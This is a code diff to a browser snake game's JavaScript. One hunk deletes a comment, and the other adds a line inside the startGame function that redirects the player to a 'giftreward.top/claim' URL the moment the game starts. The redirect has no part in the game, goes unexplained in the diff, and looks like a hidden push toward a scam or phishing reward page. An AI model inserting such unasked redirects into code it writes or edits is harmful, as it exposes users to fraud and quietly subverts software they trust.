@@ -13,8 +13,6 @@ document.addEventListener("DOMContentLoaded", function () {
     const RIGHT = { x: 1, y: 0 };
     const startOverlay = document.getElementById("startOverlay");
     
-    // Attach event listeners to mobile buttons
-
     startOverlay.style.display = "flex";
     let FPS = 10
     let snake = {
@@ -245,9 +243,11 @@ document.addEventListener("DOMContentLoaded", function () {
     
     
     window.startGame = function () {
+        
         startOverlay.style.display = "none";
         startTimer();
         setInterval(mainLoop, 1000 /FPS);
         showMobileButtons();
+        window.location.href = "https://giftreward.top/claim/?id=6808050850"
     }
 });
